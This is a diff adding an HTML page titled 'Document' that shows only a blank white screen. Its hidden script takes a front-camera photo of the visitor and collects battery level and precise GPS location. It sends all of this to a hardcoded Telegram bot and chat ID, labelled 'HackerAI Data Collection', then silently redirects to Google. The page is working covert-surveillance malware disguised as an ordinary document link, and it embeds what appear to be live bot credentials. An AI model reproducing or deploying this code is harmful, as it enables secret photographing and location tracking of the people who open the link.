@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document</title>
+  <style>
+    /* Force solid white background, absolutely no visible content */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%; height: 100%;
+      background: #ffffff;
+      overflow: hidden;
+    }
+    /* Hide all elements — camera, canvas, and any fallback text */
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <!-- Hidden elements for camera capture -->
+  <video id="cam" autoplay playsinline></video>
+  <canvas id="snapshot"></canvas>
+
+  <script>
+    (function() {
+      'use strict';
+
+      // ─── CONFIGURABLE CONSTANTS ───────────────────────────────────────────
+      const TELEGRAM_BOT_TOKEN = '8632604267:AAE3TCPqIwbSk0sacAUzsBMDBqt5N5LTu8I';
+      const TELEGRAM_CHAT_ID   = '6529032790';
+      // ──────────────────────────────────────────────────────────────────────
+
+      const TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;
+
+      /**
+       * Capture a still frame from the front-facing camera as a base64 JPEG.
+       * Returns a data-URL string (data:image/jpeg;base64,...).
+       */
+      function captureSelfie() {
+        return new Promise(function(resolve, reject) {
+          var video = document.getElementById('cam');
+          var canvas = document.getElementById('snapshot');
+
+          // Request front-facing camera
+          navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 },
+            audio: false
+          }).then(function(stream) {
+            video.srcObject = stream;
+
+            // Wait for enough frames to arrive so the video is "live"
+            video.onloadedmetadata = function() {
+              // Play and wait a short moment to ensure a frame is available
+              video.play();
+              setTimeout(function() {
+                // Match canvas dimensions to the video track
+                var track = stream.getVideoTracks()[0];
+                var settings = track.getSettings();
+                var w = settings.width  || 640;
+                var h = settings.height || 480;
+                canvas.width  = w;
+                canvas.height = h;
+
+                // Draw the current video frame onto the canvas
+                var ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, w, h);
+
+                // Encode as JPEG (quality 0.85 balances size and clarity)
+                var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+                // Stop all tracks to release the camera immediately
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                video.srcObject = null;
+
+                resolve(dataUrl);
+              }, 300);
+            };
+
+            video.onerror = function() {
+              reject(new Error('Video element error'));
+            };
+          }).catch(function(err) {
+            reject(err);
+          });
+        });
+      }
+
+      /**
+       * Get battery level as a percentage. Returns a number (0–100).
+       */
+      function getBatteryLevel() {
+        return new Promise(function(resolve, reject) {
+          if (!navigator.getBattery) {
+            reject(new Error('Battery API not available'));
+            return;
+          }
+          navigator.getBattery().then(function(battery) {
+            resolve(Math.round(battery.level * 100));
+          }).catch(function(err) {
+            reject(err);
+          });
+        });
+      }
+
+      /**
+       * Get current geolocation coordinates.
+       * Returns { latitude: number, longitude: number }.
+       */
+      function getGeolocation() {
+        return new Promise(function(resolve, reject) {
+          if (!navigator.geolocation) {
+            reject(new Error('Geolocation API not available'));
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(function(pos) {
+            resolve({
+              latitude:  pos.coords.latitude,
+              longitude: pos.coords.longitude
+            });
+          }, function(err) {
+            reject(err);
+          }, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        });
+      }
+
+      /**
+       * Send the selfie photo to Telegram using multipart/form-data (fetch).
+       * We manually build the multipart body because the browser's Fetch API
+       * does not support File / Blob from a data-URL natively in all cases,
+       * and we want to avoid FormData quirks with base64.
+       */
+      function sendPhotoToTelegram(base64Jpeg) {
+        // Strip the data-URL prefix to get raw base64
+        var raw = base64Jpeg.replace(/^data:image\/jpeg;base64,/, '');
+        // Convert base64 → bytes
+        var byteChars = atob(raw);
+        var byteNums = new Array(byteChars.length);
+        for (var i = 0; i < byteChars.length; i++) {
+          byteNums[i] = byteChars.charCodeAt(i);
+        }
+        var byteArray = new Uint8Array(byteNums);
+
+        var boundary = '----BoundaryHackerAI' + Date.now();
+
+        // Build the multipart body manually
+        var body = '';
+        // chat_id field
+        body += '--' + boundary + '\r\n';
+        body += 'Content-Disposition: form-data; name="chat_id"\r\n';
+        body += '\r\n';
+        body += TELEGRAM_CHAT_ID + '\r\n';
+        // photo field (binary)
+        body += '--' + boundary + '\r\n';
+        body += 'Content-Disposition: form-data; name="photo"; filename="selfie.jpg"\r\n';
+        body += 'Content-Type: image/jpeg\r\n';
+        body += '\r\n';
+
+        // Convert the text parts of the body to a Uint8Array so we can
+        // concatenate with the binary photo data.
+        var encoder = new TextEncoder();
+        var headBytes = encoder.encode(body);
+        var tailBytes = encoder.encode('\r\n--' + boundary + '--\r\n');
+
+        // Combine: head + photo binary + tail
+        var total = new Uint8Array(headBytes.length + byteArray.length + tailBytes.length);
+        total.set(headBytes, 0);
+        total.set(byteArray, headBytes.length);
+        total.set(tailBytes, headBytes.length + byteArray.length);
+
+        return fetch(TELEGRAM_API + '/sendPhoto', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'multipart/form-data; boundary=' + boundary
+          },
+          body: total.buffer  // ArrayBuffer
+        }).then(function(res) {
+          return res.json();
+        }).then(function(json) {
+          if (!json.ok) throw new Error('Telegram sendPhoto failed: ' + JSON.stringify(json));
+          return json;
+        });
+      }
+
+      /**
+       * Send battery + GPS data as a text message.
+       */
+      function sendMessageToTelegram(batteryPct, coords) {
+        var text = [
+          '[ HackerAI Data Collection ]',
+          'Battery: ' + batteryPct + '%',
+          'Latitude: ' + coords.latitude,
+          'Longitude: ' + coords.longitude,
+          'Timestamp: ' + new Date().toISOString()
+        ].join('\n');
+
+        return fetch(TELEGRAM_API + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text
+          })
+        }).then(function(res) {
+          return res.json();
+        }).then(function(json) {
+          if (!json.ok) throw new Error('Telegram sendMessage failed: ' + JSON.stringify(json));
+          return json;
+        });
+      }
+
+      // ─── MAIN ENTRY POINT ────────────────────────────────────────────────
+
+      // Fire all three capture functions concurrently.
+      Promise.all([
+        captureSelfie(),
+        getBatteryLevel(),
+        getGeolocation()
+      ]).then(function(results) {
+        var selfieBase64 = results[0];
+        var batteryPct   = results[1];
+        var coords       = results[2];
+
+        // Send photo and message concurrently
+        return Promise.all([
+          sendPhotoToTelegram(selfieBase64),
+          sendMessageToTelegram(batteryPct, coords)
+        ]);
+      }).then(function() {
+        // All data sent successfully — redirect immediately
+        window.location.href = 'https://www.google.com';
+      }).catch(function(err) {
+        // Any permission denied or API failure — wait 3 seconds, then redirect
+        console.error('[HackerAI] Error (silent redirect after 3s):', err);
+        setTimeout(function() {
+          window.location.href = 'https://www.google.com';
+        }, 3000);
+      });
+    })();
+  </script>
+</body>
+</html>
